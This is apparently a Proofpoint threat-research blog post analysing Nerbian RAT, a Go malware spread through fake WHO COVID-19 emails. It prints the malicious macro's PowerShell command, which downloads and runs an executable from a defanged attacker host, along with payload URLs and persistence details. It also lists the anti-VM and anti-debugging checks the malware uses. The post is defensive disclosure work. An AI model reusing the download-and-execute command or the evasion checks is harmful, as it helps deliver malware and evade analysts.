<div>
<a href="https://www.proofpoint.com/us"><img src="https://www.proofpoint.com/themes/custom/proofpoint/dist/app-drupal/assets/home.svg" style="max-width:80%;height:auto;width:auto;"/></a><a class="breadcrum__item-link" href="https://www.proofpoint.com/us/blog">Blog</a><a class="breadcrum__item-link" href="https://www.proofpoint.com/us/blog/threat-insight">Threat Insight</a>
 Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques
 
 
<img alt="covid19" src="https://www.proofpoint.com/sites/default/files/styles/image_768_300/public/misc/Blog_Covid19.jpg?itok=7_hP9Lyi" style="max-width:80%;height:auto;width:auto;"/>
<h1 class="blog-banner__heading">
Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques
</h1>
<a class="addthis_button_facebook"></a>
<a class="addthis_button_twitter"></a>
<a class="addthis_button_linkedin"></a>
<a class="addthis_button_email"></a>
 May 11, 2022
 Andrew Northern, Pim Trouerbach, Tony Robinson, Axel F
 
 
 <p></p>
<h3>Key Findings</h3>
<ul><li>Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities.</li>
<li>The malware, written in the Go programming language, uses multiple open-source Go libraries for conducting malicious activities.</li>
<li>The malware, called Nerbian remote access trojan (RAT) leverages COVID-19 and World Health Organization themes to spread.</li>
<li>Proofpoint researchers named the malware based on a named function in the malware code. Nerbia is a fictional place from the novel Don Quixote. </li>
</ul><h3>Overview</h3>
<p>The newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source libraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several encryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower barrier to entry and ease of use. </p>
<h3>Campaign Details</h3>
<p>Starting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to multiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be representing the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by security researcher <a href="https://twitter.com/pr0xylife/status/1519704793593307136" rel="noopener noreferrer" target="_blank">pr0xylife</a> on Twitter. Proofpoint researchers observed the following indicators and attachments:</p>
<p>From: who.inter.svc@gmail[.]com, announce@who-international[.]com</p>
<p>Subjects: WHO, World Health Organization</p>
<p>Attachment Names and Types: who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc</p>
<p>The messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing macros.</p>
<p><img alt="WHO" height="534" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.57.37%20AM.png" style="max-width:800px;height:auto;width:auto;" width="852"/></p>
<p>Figure 1: Example email that purports to be from WHO.</p>
<p><img alt="Word doc" height="447" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.57.54%20AM.png" style="max-width:800px;height:auto;width:auto;" width="835"/></p>
<p>Figure 2: Attached Word document.</p>
<p>The emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals information relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is similar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus. </p>
<p><img alt="COVID-19" height="619" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.09%20AM.png" style="max-width:800px;height:auto;width:auto;" width="818"/></p>
<p>Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the malicious document.</p>
<p>In addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government of Ireland, and National Council for the Blind of Ireland (NCBI).</p>
<p><img alt="logos" height="616" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.20%20AM.png" style="max-width:800px;height:auto;width:auto;" width="818"/></p>
<p>Figure 4: Document with additional logos related to government and non-profit entities.</p>
<h3>Attack Path</h3>
<p>When users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:</p>
<p>powershell IWR -Uri hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog -OutFile C:\Users\[username]\AppData\Roaming\UpdateUAV.exe ;C:\Users\[username]\AppData\Roaming\UpdateUAV.exe</p>
<p>This batch file performs a PowerShell Invoke Web Request (IWR) to the URL:</p>
hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog, 
<p>It renames the downloaded file to UpdateUAV.exe, and drops it into:</p>
C:\Users\[current user]\AppData\Roaming\UpdateUAV.exe. 
<h3>Dropper: UpdateUAV.exe</h3>
<p>UpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in size, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this malware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total.</p>
<p><img alt="UpdateUAV.exe " height="247" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.39%20AM.png" style="max-width:800px;height:auto;width:auto;" width="712"/></p>
<p>Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size.</p>
<p>Proofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample. </p>
<h3>Functionality</h3>
<p>UpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string embedded in the sample:</p>
<p> K:/W_Work/Golang/src/RAT_Dropper/main_gen.go</p>
<p>According to the source path, this executable is a dropper. Proofpoint named this malware “Nerbian RAT” based on one of the function names in the dropper. The specific function name is “main_downloadNerbian” as shown in the following figure.</p>
<p><img alt="Nerbian RAT " height="355" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.54%20AM.png" width="396"/></p>
<p>Figure 6 : Nerbian RAT main function code.</p>
<p>There are additional references to "Nerbian" in some of the Go functions scattered throughout the binary.</p>
<p><img alt="RAT" height="75" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.59.09%20AM.png" width="500"/></p>
<p>Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system.</p>
<h3>Code Reuse</h3>
<p>Most software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for Nerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:</p>
<p>github.com/go-ole/go-ole – Go bindings for Windows COM (Component Object Model – inter-process communication)
github.com/gonutz/w32/v2 – Go bindings for the Win32 API
github.com/mitchellh/go-ps – Library implements OS-specific APIs to list and manipulate processes
github.com/StackExchange/wmi – Go package for Windows WMI, providing a WQL interface</p>
<p>Out of all these references to external projects the most interesting is:</p>
<p>github.com/p3tr0v/chacal/</p>
<h3>Anti-Debug, Anti-VM, Anti-Forensics</h3>
<p><img alt="Chacal GitHub " height="650" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.59.37%20AM.png" style="max-width:800px;height:auto;width:auto;" width="775"/></p>
<p>Figure 8: Chacal GitHub page.</p>
<p>Chacal is described as, “Golang anti-vm framework for Red Team and Pentesters”. However, there are several functions and references in the project designed to make debugging and reverse engineering more difficult as well.</p>
<p>The dropper will stop execution if it encounters any of the following conditions:</p>
<ul><li>The size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB.</li>
<li>The name of the hard disk, according to WMI contains one of the following strings:
	<ul><li>"virtual"</li>
<li>"vbox"</li>
<li>"vmware"</li>
</ul></li>
<li>The MAC address queried returns any of the following OUI values:
	<ul><li>00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6, 00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F</li>
</ul></li>
<li>Any of the following reverse engineering/debugging programs are encountered in the process list:
	<ul><li>processhacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe, procexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py, autoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe, dumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe, sysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe, Fiddler.exe, httpdebugger.exe</li>
</ul></li>
<li>Any of the following memory analysis/memory tampering programs are present in the process list:
	<ul><li>DumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe</li>
</ul></li>
<li>A time measurement function checks to see if the amount of time elapsed execution specific functions is deemed "excessive". If the time threshold is reached, the malware assumes it is being debugged, and will exit.</li>
</ul><p>In addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:</p>
<ul><li>Uses the IsDebuggerPresent API to determine if the executable is being debugged</li>
<li>Appears to query for the following network interface names:
	<ul><li>Intel® PRO/1000 MT Network Connection</li>
<li>Loopback Pseudo-Interface 1</li>
<li>Software Loopback Interface 1</li>
</ul></li>
</ul><h3>Download, Execution, and Persistence</h3>
<p>In the case of analyzed sample, the dropper attempted to download its payload from:</p>
<p>hxxps://www[.] fernandestechnical [.]com/pub/media/ssl</p>
<p>And will save the RAT to:</p>
<p>C:\ProgramData\USOShared\MoUsoCore.exe</p>
<p>Next, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish persistence.</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABNoAAAA5CAIAAABvdtEiAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAACTuSURBVHhe7Z1/aFxV+v+TzzcLE+jCBCrfGajQKe3n64QKTrFgwu4fpriwkX7ABBeaUMFNFTRRsMkKmuyHpdsouEkXaqKwNl2oTD5gmQiWRHBJ/KNL8oeSESoz8m3JCBYSsDADFRJoIJ/3nXNy586de547c5Pmh75fxHrOeeb8ep7nnDnPzL136jc2NuoqGH53eOzy2MrKyuzcbNvTbbqUELL/GX9/vO98X+xwbOS9kY7nOnQpIYQQQgghO453OEoIIYQQQgghhDxU/kP/nxBCCCGEEEII2UEYjhJCCCGEEEII2QUYjhJCCCGEEEII2QUYjhJCCCGEEEII2QXKwtFzfzx36nendIZsjXMvn2tqaqqvr4dWddGe5EjsyPC7wzqzN9iKH67cXYHO01+ndX4LQDNoCvS92qeLfhZ0v9D9bPuzOrOzVDrbNtorGIKVuR9uI9wPA8P98KHC/dDJz9XKZLfYxbfRPbiZE4Havh3FeWL8w3GdKUcQPTyOHDsy/FdvbxNEO8DMjZmJf07MfTmXz+fHPhjTpT9rdsUBKgkdCHWd7QofDOv8FljKLW1sbOy1HzraScfegb62aK+tj3ArVuZ+WCXcD3cL7ofbCPfDlZUVRO9NjzQ1NjY2x5uxqLXAQKFQaPx149T1KZ13IIjAuZfPqagYRB+NIlu4V9CyPc56nR73r+oRDiGqh9K0qApq2jcCqxfmG/rvIZ2pq+vs6GxtaVXptbU1iDByvAaa7/xD58rd0vhH/zaKQkwN1nc2LtfadYIpauKjCZjRGUtHo1GU+H5aJKg3MLUuvf3IPr5Yd/LjyeWV5f43+nXegSDaGbLfZWOHYoknEuFwOBQK6VLy8IHCk9eSscMxnf95sZOOvTN9bcVeu77M9xTcD0kl3A+3C+6HOLgnTibS6XTyanJ+YX7o7aHc7ZyWGcB0el/pHbpQOprbCCJF5FAkk83gb/Sd0dT1FCIcLdgPDL41mElnRt4bgaKgNKhOC7aVrajXRN/rfQjDMPLFrxZh6GgkCqdSIsTJA28ODJwfgKj99+2wyNyXc0ok1NoLBFYU3q0ytzLqA4WZz2fqGlTxThNg6e1LNhz0vNjT9kzbxQsXwwfD+MOKUuX5fF6/2sGVf1yRRaDrTBcatD7tC4cjkQicVZUrRi6NWNtuQx1EeKUu3WT1/uryD8urq6s6X0H8sfjgn/UIXThF2NTs8djA/7Ccgol0xgB0qLWwCUq0bGMD7zQYG6YcOxpzaWPsgzFoaXZuFoc2pRMsbJQro/S+1usyCpi/OQ+R9UlqQ138eDw5mdQCsdbGA2sioQMhdAdbwwQX37moReIIPe0lOwAQGlxeXlafBGPNY9bTn02rcpMfAmFe2DV093V1SnVOTH0JOlS0Pd0GdelMdZj6AlA1XMvq67FSX9hfMGa1TDDrjuc6rITDKDZOxwbC+lKK0pmNDQyj/0/9Ko3XQ9TzUg+Gh0GiR1XuwtmX7wiNVjY7m2AvX6MoXNoAwpYi7zaeVjb5IfdDhRLpjAHoUGthE5RoGffD8ga5H6pC7od7cz+ExqAieLjOV+C5R+V/zKNWaiql8w4EEcyB4ekMRvveCNRid23aHICnR1lA868Zl7mpQZPmJQd4YP2SP9RbfKGeY8lzDA3K+4bgAMHU6xwSwPhbnmpRaUzEHrwLqNTpKhgJKqq0UEvYvmTHFqwcYH0FUBT0j3K4jeoCc8fgYRdfZxPUC4SlZ2pQXnqmWiCIDkW8az3YwARLc3lgbbBYHTpbdV/ucBSGhPaxM0Jl0DvcRcuKYGKYns6U4ynC+OxFtZheROO2yWe/mIUo9UkK71UQwXVUuQ3Mab3Ay3sAlI7WPM3jEmEMmJdK20BZMGEwkc6I4GXOzVRhOfeBEIa3lFuanpmGZ4xdLmkM2oPDwahwF2zo2O+WbluXzWAYtg7hVU6jQHswLV6PBlHdKRJqQbEwFs4EmWwGp0mI7EkJI/S1l6cDCA1ijnBN7EEYHmZqzWVzO8PgUcvTD4V5KfB2iEJ7ySmEvgQdKmo9fgl9Xbl6BQsSKxPl0Lk9TvXeBlfHSJDAy/AHZ1C1bCp9XlhfUBQ2epUGcF3n8Qu1oF4MA4PBkDBIJbJx9SWPULCy4GwKT3v5GgVUakNwUV/vNYWj6IL7oSzSGRG8jPshEBrkfmiPk/uhy16+RgGV2tj2/RB27Hhehx+emPao/jf6oXCdKcckcoWjatYYrZ313BxMHgWQLWn+dDte5tS8qUGT5iUHKA9HAZSJllXa15Se+4ZcK4B6MVQYS2fK4yXLys91QAkqa7N6fxX9Ordo2AhRkEqbagFh+5LnhRJvKwddX7UqyuooFELv2L4wfbSMxYI2UWJJzc4mqFdYekKDwtITaoEAOhQQamHjgn4wGKRhawSftjNU35c7HLXdCyANX9GZIp5LReEpwtuDc09xviWoIXq6r8K0tSngH2WfcDtwiTAqqAYJOCjGgx4B7Ae/DyayGvUDbuGcuMKlT6QxVJ0pjtPlSQooDb6oM0W/dBnFBsvJfosValkfUG0uFfXmZ69YYYS+9vJ0AKnB4iqCg6qsE8EPfbXh+XYu9OXCqUNFrccvoS80jvHrDLJPJuBaSKj3NryNqc0u/2NezQIJ9UpFpc8L68uZBs55WZ/pHgyjO50909Xym9JHdwpXX/IIBSsLzqbwtJeLSqOASm0ILurrvaZw1OSHCu6H3A9VthLuhwruh04r7+v9EHbEqV1nvDDtUTh540yMIEHnHZhEznAUSoZjq/1HYdocTB4FyjS/7Na8qUEXtuYlB6gIR+FgzvXrpNKUwnuKjatWAPWi0NYGKIuX5mYRMMA9EM5hFmhBlWMJY14IKlQWYAxwCZU21QKwiGn7cuGal8kogddXrYqylknxIwb4HkIs+BJiOXtIgrMJ6hWWntCgsPSEWiCADgXkWtAeJo5C/Ju5ldGltfTlvne0+VizTtXVRQ9G816XENRE7FjpLgik7Suenz39LNqPPhrt7uoef3+88m5v9bEBDKnzDqY+ncrdyQ2cH9B5B5Witt+2Zb/Lrv20BhH+5r6cS39j3YgMswUTWY3WTuFeYeXuysCbA8Wb3C2QxlC1WNHg3X4sVtJh+EDYNkqhUEAjJxInotFo0yNN6W/TGLASAc9aqIKRoIoqh6NgAau0PEJfe1UiN5hOp/F+gz+VdSH4oUkbAkJfsg4DIPSVvZNNJEr2RafZ21mdAQ3WjQr4P/5VibW10kjghJ4+b1pfMthe0Z2i+fFmlx+a+vIcoWBlwdlkfI3iOULBRQN4r4L7oa/IarR25M1Bw/1wE+6HSHA/3PX9UMa0RyFQQXjpeXueIMp9n1MKxMQjByOpT1NaoPDaHEweBXWVaT7ipXmvBn00L7poGev6/8HWl1wrmHpNtD3dhkAOoQW0kbyWxCJa+PeClpmRa5m2L39tVBhlK+srsKK6X7CWSffZbp0v4rN9GRCWXrAG/WvVokMB31rtp9uhQxSOXLICTlVYU18VjzIqv1V3bd1/qfiwuQ4t1utW161v/AHMv3R7KTWZih2NjV4ejT8ex7iVyBfser3Fu2V03kGlCHoJHQjNL8xPz0wPvT008/kM0i1PtmD7CCbS7QbC9cGh9Q2DAxwmdErENoq6lRy2T3+Vzt7KJp5ICPZSolBDcfcs/qtwpoFphIHtJU/ZSNV+uEUXrUmHO4y9WIDR5w3ry6VAF42/atQpL4T15cLuztPKvs5mwtconiMUXDT4bsP9kPuhA+6Huwj3w93dD2OHY7m7PmdWE9g00t+k5/6ln3zjxCRCOJG5ZT3KaPW+dZGh9ZGBgyo3h+rxbLDW5eB0URscx6OHoiodbH351qpVvZX7dmOjYwk0WOElnGoxvdja0qoeEosgCv/m75U+7UL0B0fSGeBVS2PYvnznZbJy4PUVwA9Bz4s9Y5fH2p+xrv6tBkG9O7/0atKhL1Kt9TqsU9h6/qZ17YCTKvuq7cm6lpad270Dk2jx1qJdDjdtjpc+JrHct3iLcyadgUnmbpb5AXw9932u8tOmmRsz2e+yQ296fIxhErX9tm3mXzPoov+NfngbVNb6W/3Y5WAihWmEnuCtAo6Itafz2wFawxLCFoCNO3IwgsFogRmcKTGS7B398cnaT2v2xzP+IxTtVekAcoOJRAIDxk6t8w8ToS9fHUJjJhN7OoDQV/xoPJ22vlNSYDnEj5W9xZoQfN60vsLhsLrZQ+Hay5y18JaPnVFnxL48EawsOJuMbBRphIKLyt5rtrIA90MlUnA/1OVFuB8quB/a7Pf9sON0B/qClXW+AmEHgE56X+otC1E2MYkaGxrjx+OIQjEYXeSHyaOU5pFV5VA7pqzSMr7LwRd0hK1S3ccI/NeX1xuHb61a1dsUbnJ+D1n4qYAFojPlQKX5+1YICh3CFpiLKgfWW8DJsrcAG7uWTAD1bnF9BfBDYIle68WScSJsXz7qNSw9oUFh6Qm1TAg6tKlcy761+s73oRYmNXVjauIj/Ts01fRl8x/6/9WBzR09QYOVO45JhBKMMncnN/HPCbyg95VeVT51fWr8w/Hst1m8UY1/NA4LJR4v+0J55NLIkdiRmc9ndH6ToQtDPS/1YJI678AkwrEJfcED4K/RaBRt4mi1FZHCNEIT8D80OPzuMN480t+kx98fx1LUskDAEXEutFLrRVeoboeFCcY/0BcJuNaeMEJfe3k6gNBg95nu2OFY++l2eCr8HosNUiXadoS+fHXY2tI6/fk0Bg+NuXzb0wGEvnpf7Z34eGLy40ksB+gk/XW67/Wqfmpc8HnT+sL7xMLXC1A70qN/H3XNy66FwUxenxx4vXSVl9CXCcHKgrMJyEYxjVBwUV/vFawswP1QiRTcD5VIwf1Qwf3QaeV9vR9iFjhVI3iAESGCrlwLVt4B8GKYAG6g8w4EUU0IHjVwfgCGwMghwssw5WoItqWA/I95qBd6xoYJ09jXUfs26LlvVDOMmtSL8BgLZPJ/JjFILAeI7ID5VNsplCz8ewEiOAle1vlf+id2el/vRRVIYX3MCC+wgrQiQi2BYOrd4vraLj8UnE1Qr7D0hAYxMNPSC7aL+r75eq5l6Q3xU2teqeup+PF48moSY8Aclci3rxL629MiPebb/RWIvBNPJqzPbzafX2fjKeo60wUzdJ3tQjnWpPOu4tkvZlt+0wIVQ4SOKm8v9rwtfnpmGvZz3idtI4jUd8d4AdLQMtJ5+xF5gUQKzxEqMFO8B+uMg+S1JCaLcSrfctYdKz6RWWccCEaBzlueaolEIuhr8K1BNIi3JSWSTFl8Fjb6ih2NoRB1nXYxjdDXXibfEKYMY8E34BioBSe22xQGL4hQjq6dxB0PPzD1JehQsbq6CjfGERwNup4xYHIAU18AKzNSfCQ3lA/NqEL1iSMSmaz1rP/V+6t4M0Niqfj8D8GxhfUFrDMKrIx5/XnQqSi8HrqCtLKWqS95hMBoZbOzCfYSjCJoQ3BRX+/1tDL3wypFCu6HTky+wf3QqSvuh3Z3gr0Eowja2Pb9ECz/sIxyaAmdYnhXig/StBF2AAWGjX51phyXCFlMVmcqMG0OwNOjLKD5zR96GXnP+qUNbGJaZG7QpHnJAYqPMrLAGA7HYG6ndXzXl+e+4VtL4dKhE5cI9kU7UBQ6gh2dJoZaMADlGxC5FhGySr0QOR9rJNQKtmMDwcoB1peTKhUF/WM6Kq1YcjzKCJicTVCvvPSM3isuPaFWEB0WMa1lz1pwe6ws54KCGjEYrAuVlfuysVbUw8N6ezjt88N0NQHfhbfpTDmCiJD9i+DYO7m+9gj7eplzPyRki3A/dLK/ljmOrTiSzns9jlsQbT8PrGefms7E+5e9ot49DxW1N6ntYt3dpVAotD3T5vkVvCAiZP+yk4699xcRl7kT7ofklwb3Qyf7bpnHDseSV5N5r4c/C6JtIfe9dSX2ysoKlDbw9kA4HLavn/zZsIvq3V9QUXuTeoSkOvkQ6O7qLvxUmP5sWucJIdsH19f+gvYi5OHB9UVM5O7kOs90Zr/LhhpCJ06eGLs0Ft/8LQpCyF7g4YajhBBCCCGEEEKIJ/vpYl1CCCGEEEIIIT8bGI4SQgghhBBCCNkFGI4SQgghhBBCCNkFGI6SrXLuj+dO/e6UzuwsR2JHht8d1hlCCCGEEELIvsIdjq6srHS/0N30SFNjY2NzvHninxNaYKBQKDT+unHq+pTOOxBE4NzL5+o3iT4aRbZwr6Ble5z1Oj3uX9UjHOp7tQ9K06IqaGpqGv9wXGf8CKxemM/5/PfOjs7WllaVXltbgwgjx2ug+c4/dK7cLY1/9G+jKMTUYH1n43KtXSeYoiY+moAZnbF0NBpFSfrrtM4bENQbmFqXHiGEEEIIIfudsnAUB/fEyUQ6nU5eTc4vzA+9PZS7ndMyA+FwuPeV3qELHr98JYgUkUORTDaDv9F3RlPXU4hwtGA/MPjWYCadGXlvBIqC0qA6LdhWtqJeE32v9yEMw8gXv1qEoaOR6PLKshIhTh54c2Dg/ABE7b9vh0XmvpxTIqHWXiCwokKhUOZWRn2gMPP5TF2DKt5pAiw9QgghhBBC9j0bDvr/1I/TeT6f1/kKVu+vLv+wvLq6qvNF8j/mUSs1ldJ5B4Ko56We2OGYzmxsIM7BYOyuxz4YQxQxOzebeCKBCCESiSAKUqKL71xEHIvC+GPx5GRSFVo82Oh9rTd0IISKFy9cRON4pRaZG5y/Od/2TFv4YNhq8HipQYQEGE/X2S7VWsdzHVZCNfjA+mmckUsjxRfqOQ7+eVBlTQ16/q7ulX9cUVJTLRBMvc4hAYy/5akWlcZE7MG7gEq7znTpDLLH46io0kKtnhd7MHhoCePHHwJ1LRDnBQQrJ68lMRgUxo7G4Buq0AJWfsXbygEUBf2jHG6jusDcMXjYxdfZBPUCKAoDUzNy6hOYGpSXnqkWCKJDEe9aDzYwwdJcHmygO6wOnQ3aFyGEEEII+YVTFo7iKNnxvA4/PMERHIf1ymN9/xv9OJ7qTDkmkSscxakaLS8vL9tZnM5xAsbZGtEvgsOl20sov3L1Co68OPsiizO6K3LAuXz6s+lMNtN+uh0vQ4kSAVODqU9SOD2jcCm3pMaACArlKhzFTCFFAv3iDy1YbZWHo6Dt6TY7GjE1aINBolxnNpFrBVCvEC9ZVn6uw/WZAli9v4p+xy6XxgYbIQpSaVMtgHAU8SGCusytDNTiHLw8L5R4WxlR4oEQ4i7Ump6ZRohljwqTKln59+1o0GnlWhWlwlH0jlAZ00fLi+lFtIkSS2p2NkG9s1/M4pWYOJwZrSFmVuVAaFBYekItEECHAkKt5R+WoR8MBmnYGsGn7QzB+iKEEEIIIaQsHMWpF6d2nfHCFI7i5I0zMYIEnXdgEjnDUZzacRzHAVdlgQpdnMduBSIKBD86g+yTCfsbG+t7uc0IAZ2iuisc9WzQBdrv/5OlARWOIvJU8Un+xzyO4ypRGY52ne2ywzYXdoM2nuGoC1etAOpFoTFemptFwID4AeEcZoEWVDliCczL+eUbxgCXUGlTLQCLOKePNEJQnSnHNS+TUVwtII1wUaXLrFy0iNPKtSpKhaNIwPcQYsGXEMvZQxKcTVCvis0843ahQWHpCbVAAB0KyLWgPUwchfg3cyujS4P2RQghhBBCSG1P1lVf9eDwrfObIFBBeOl5e54gyn2fKz4RqP5E4kTkYCT1aUoLFA11OHnr9CbZO9lEolSIitnbWSTWflor3Csgq8rRqXWBqAuvBguFwsCbA6gYjUabHmlKf5tGU1oGGqx7C/F//KsSa2sOqZN1/X+fBg3ItYKp10Tb020I5BBaQBvJa8nYsdjCvxe0zIxcq/lYs07V1UUPRu0rk/21UWEU2HHl7gpqKd8ASOfuWDdSorUyKx9yWzmworpf6B5/f7z7bLfOFzE5m8yzp5+FBqKPRru7rDadj7kK1qB/rVp0KOBbq/10O3SIwpFLVsCpCoP1RQghhBBCCCgLR2OHY7m7Ac+RQ28Ppb9Jz/1LP/nGiUmEcCJzy3qU0ep96yJD694zB+EDFfHk1vBsUD2tB8fr9Ffp7K1s4onE2roUPa6uW1e0usBxPHooqtK1NqjwrVWrelXw7KSxsVGnQIMVXl68cHExvdja0qoeEosgCv/m75XucUX0hyhOZ4BXLU35E4DswfvOy2Rl1zfwq6uW2kMNxY8Giv8qnGlFAD8EPS/2jF0ea3/Guvq3GgT1QmNLt5dSk6nY0djo5dH443EEbEoksJWlV5MOfZFqrddZVw00WFdc65JNgvVFCCGEEEJ+4ZSFox2nO2ZuzCAI0fkKIMp9n/P8hhCn8N6XestClE1MosaGxvjxOKLQ0AH34d5E/Gg8nS79CAfiovgxK4hFC+GD+sY/sLKyUk0MABAsIUpBlIXYOHIwgtlpQdWgI5zR1X2MwLdBK5LZ/CrVxrdWreptCjc5v4cs/FQIh72DFqg0f98KQaFD2EJdpaxAuvWk9++X2LVkAqgXdsSMUFHnHSgrZ+/o7wYxwcqf2Angh8ASvdbrCqpNzgZ81Iu4vfhsp0w6A/eYu6nnIjQoLD2hlglBhzaVa9m3Vt/5PtTCpKZuTE18pH+Hppq+CCGEEEII8UZ/nVEk/2MeJ8vEE4npz6Zx6k1eSzqfkgpM944qrHv5Gupm52Z13kGlqKf8UUYuxorPC9UZB1f+4X6sC0ImJUIWVTByiKzLiSseZeTZoHXT4Cu9Vqr4YF40iIEhp6IyJDLZDBKr91ehHCSWckvq3lHrh15uZVKfpKAuxFr2M1FNDdogNkOsgtactxf61gI1qRetYb7JyaR+vFBD6Sm+GABK5m/OQwS1IDy2H7ejbkSEFNbvf6MfabtNoVZP8cm6Kg2gEPsGUXlespVhPigfIxm7PGb7ITwwdjSm7lxVI3RaWVG9oux7R22c944KziaoFy6BeaEcfSkRqiuR0KCw9IRaIIAOFZ5rWaiFV0KEQiv9SQp6wxyVyLcvQgghhBBCPCkLRwHO0F1nusLqlzkei6sHadrI4ShAsNHyG/1MFxcuEbIBwlGAKAjhH4aHsARndF0KigGP9QVaODzynvVLGwgGtMjcIE7PLU+1IBLA63GGRtCl4iXfcNQCYzgcQ2TifK6PqUEbvCDxZML6jtTxQy++tRQuHTpxiRDroh0oCh3Bjpi+FhR/hgQDgDaUCFGEFhRBVqkXIudjjYRaQjgqz0uwMiyLdjAMvAC1Si4HKxdDQVgfvaBZ1/gVVSoK+sd0VFrhDEeBydkE9c5+MYv2laJUeKkFRYzeKy49oVYQHRYxrWXPWnB7rCzngoIaMRisC5WV+yKEEEIIIcSTevxnRVbbRO773JFjR+a/nMeJXBdtIoi2n/W6xl83IpqqfOrSvmavqHfPQ0URQgghhBCy9/k/f/nLX3RyO2gKN/1n7D+ROPb/jqkSG0G0LSDM+PzG54/830fW19eH/jJ0+//fHh8bb2govx1wn7OL6t1fUFGEEEIIIYTsfbb529FdJHcn13mmM/tdNtQQOnHyxNilMfu3KAghhBBCCCGE7DV+PuEoIYQQQgghhJB9RNkPvRBCCCGEEEIIITsDw1FCCCGEEEIIIbsAw1FCCCGEEEIIIbvANoSj5/547tTvTunMQ2bq06n6+vq1n9Z0njwEVu6uQMnpr9M6vyc59/K5pqYmjBPup4vIw4RLjxBCCCGEbDs78e0owobxD8d1Zm9z5NiR4b8O68zuUTmM7dLhxEcTCCqcHx9Eo1FX8Bk6EOo62xU+GNb5vcfMjZmJf07MfTmXz+fHPhjTpUUqFVXNlHeMlZWV7he6mx5pamxsbI43YxZasK1ACcPvut24u6v7VNsOfWxECCGEEEJINfBi3RKTH08uryz3v9Gv87vEwx5GKBTK3MogLkJ65vOZuopfZg2Hw8lrydjhmM7vPbLfZWOHYoknEhgqpqNLzfhOeWcoFAqJk4l0Op28mpxfmB96eyh3O6dl20r8eDyXc7eMkvhj/OkjQgghhBCyh3CHo6N/Hz0SO1L/q/poNNrd1a1Lizi/2DmRODFzY0YLigz/dRgi/OGQrUpw+K4vgkTfq30qPfGR/jpo4d8Lp353Cq9HX82PN0/+z6QqVwjDsMl9n8Nr0LLOV1dL4OI7FxEEhg6UwpvxD8ebmprmvpzDfFWz6is11/XJkA68OaDSStT3ep9LG9XjHIasw8B9dT7fmfw4iQT+7TnbowpB9tus6gJUfnkoOIBJUWD43eHoo1HLyvEarGyqhSljbNA2rK/GqS7WlRUFTFMGQl8mKwNh8JMfT6IpiI4cOzL6t1FdWrRs4V5h/uZ8++l2xNJdZ7tQomWiogT1evaFEugHCQwSepj71xzSKInHdTgarC+byqVHCCGEEEJIEDYczH4xi5LUJ6nl5eXF9OLFCxe1YGNjdXU1djQWPx